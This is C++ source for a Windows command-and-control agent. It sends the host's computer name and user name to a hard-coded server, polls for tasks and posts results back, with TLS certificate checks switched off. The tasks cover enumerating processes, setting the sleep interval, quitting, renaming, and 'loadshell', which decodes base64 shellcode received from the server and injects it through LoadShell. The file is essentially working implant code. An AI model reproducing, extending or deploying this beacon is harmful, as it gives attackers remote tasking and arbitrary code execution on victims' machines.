#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <Psapi.h>
#include "include/Main.h"

#pragma comment(lib, "winhttp.lib")

std::wstring get_utf16(const std::string& str, int codepage)
{
    if (str.empty()) return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}

std::string Get(std::string ip, unsigned int port, std::string uri)
{
    std::wstring sip = get_utf16(ip, CP_UTF8);
    std::wstring suri = get_utf16(uri, CP_UTF8);

    std::string response;
    LPSTR pszOutBuffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"test",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, sip.c_str(), port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"GET", suri.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    }

    if (hRequest) {
        // Set SSL options to ignore certificate errors
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {
                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

std::string Post(std::string ip, unsigned int port, std::string uri, std::string dat)
{
    LPSTR data = const_cast<char*>(dat.c_str());
    DWORD data_len = strlen(data);
    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headersLength = -1;

    std::wstring sip = get_utf16(ip, CP_UTF8);
    std::wstring suri = get_utf16(uri, CP_UTF8);

    std::string response;
    LPSTR pszOutBuffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"test",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, sip.c_str(), port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"POST", suri.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    }

    if (hRequest) {
        // Set SSL options to ignore certificate errors
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        bResults = WinHttpSendRequest(hRequest, additionalHeaders, headersLength,
            (LPVOID)data, data_len, data_len, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {
                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

std::vector<uint8_t> base64_decode(const std::string& input) {
    const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    std::vector<uint8_t> output;

    // Check if input contains 'b' at the beginning and quotes around the content
    std::string clean_input = input;
    if (input.length() > 2 && input[0] == 'b' && input[1] == '\'' && input.back() == '\'') {
        clean_input = input.substr(2, input.length() - 3); // Remove b' at the start and ' at the end
    }

    int val = 0;
    int valb = -8;

    for (char c : clean_input) {
        if (c == '=') break;  // Stop at padding
        if (isspace(c)) continue;  // Skip any whitespace

        size_t pos = base64_chars.find(c);
        if (pos == std::string::npos) {
            return output;
        }

        val = (val << 6) + pos;
        valb += 6;
        if (valb >= 0) {
            output.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }

    return output;
}

void print_decoded_data(const std::vector<uint8_t>& data) {
    for (uint8_t byte : data) {
        std::cout << static_cast<char>(byte);
    }
    std::cout << std::endl;
}

std::vector<std::string> splits(std::string cmd, char delim = ' ')
{
    std::vector<std::string> result;
    std::stringstream ss(cmd);
    std::string token;

    while (std::getline(ss, token, delim)) {
        result.push_back(token);
    }

    return result;
}

typedef struct ProcessResults {
    uint32_t pid;
    wchar_t name[250];
} ProcessResults;

std::vector<ProcessResults> GetAllProcesses() {
    // Array to store process IDs
    uint32_t PidArray[2048] = { 0 };
    uint32_t bytesReturned = 0;
    uint32_t totalNumberOfPids = 0;

    std::vector<ProcessResults> processList; // To store the results

    // Enumerate processes
    if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
        return processList;
    }

    // Calculate the total number of processes
    totalNumberOfPids = bytesReturned / sizeof(uint32_t);

    // Loop through each process
    for (size_t i = 0; i < totalNumberOfPids; i++) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PidArray[i]);
        if (hProcess == NULL) {
            continue; // Skip if unable to open process
        }

        // Get the base name of the process
        HMODULE hModule;
        DWORD cbNeeded;
        wchar_t moduleBaseName[250] = { 0 };

        if (K32EnumProcessModules(hProcess, &hModule, sizeof(hModule), &cbNeeded)) {
            if (K32GetModuleBaseNameW(hProcess, hModule, moduleBaseName, sizeof(moduleBaseName) / sizeof(wchar_t))) {
                ProcessResults processResult;
                processResult.pid = PidArray[i];
                wcsncpy_s(processResult.name, moduleBaseName, _TRUNCATE);
                processList.push_back(processResult);
            }
        }

        // Clean up handles
        CloseHandle(hProcess);
    }

    return processList;
}

// Helper function to convert wchar_t (wide string) to std::string
std::string ConvertWCharToString(const wchar_t* wstr) {
    std::string str;
    while (*wstr) {
        str += (char)(*wstr);  // Simple cast from wide char to narrow char
        wstr++;
    }
    return str;
}

wchar_t* ConvertStringToWChar(const std::string& str) {
    // Get the size required for the wide string (including the null terminator)
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);

    // Allocate memory for the wide string
    wchar_t* wideStr = new wchar_t[size_needed];

    // Convert the narrow string (std::string) to wide string (wchar_t*)
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wideStr, size_needed);

    return wideStr;
}

std::string FormatProcessResults(const std::vector<ProcessResults>& processes) {
    std::stringstream formattedResult;

    formattedResult << "Process List:\n";
    formattedResult << "-----------------------------\n";

    for (const auto& process : processes) {
        formattedResult << "Process ID: " << process.pid << ", Process Name: "
            << ConvertWCharToString(process.name) << "\n";
    }

    return formattedResult.str();
}

int main(int argc, char const* argv[])
{
    std::string name;
    std::string type = "w";
    int n = 3000;

    std::string ip = "192.168.15.128"; // REPLACE THIS
    unsigned int port = 9090; // REPLACE THIS

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = sizeof(hostname);
    GetComputerNameA(hostname, &computerNameSize);

    char username[30];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);

    name = Post(ip, port, "/reg", "hostname=" + std::string(hostname) + "&type=" + type + "&user=" + std::string(username));

    while (true) {
        std::string task = Get(ip, port, "/tasks/" + name);

        if (!task.empty()) {
            std::vector<std::string> Task = splits(task);
            std::string command = Task[0];
            std::string res = "";

            if (command == "sleep") {
                int time = std::stoi(Task[1]);
                n = time * 1000;
            }
            else if (command == "enumproc") {
                std::vector<ProcessResults> processes = GetAllProcesses();
                res = FormatProcessResults(processes);
            }
            else if (command == "loadshell") {
                std::vector<uint8_t> decoded_data = base64_decode(Task[2]);
                unsigned char* data_ptr = new unsigned char[decoded_data.size()];
                std::copy(decoded_data.begin(), decoded_data.end(), data_ptr);
                wchar_t* wideP = ConvertStringToWChar(Task[1]);
                int res = LoadShell(data_ptr, decoded_data.size(), wideP);
            }
            else if (command == "quit") {
                exit(0);
            }
            else if (command == "rename") {
                name = Task[1];
            }

            Post(ip, port, "/results/" + name, "result=" + res);
        }

        Sleep(n);
    }
}
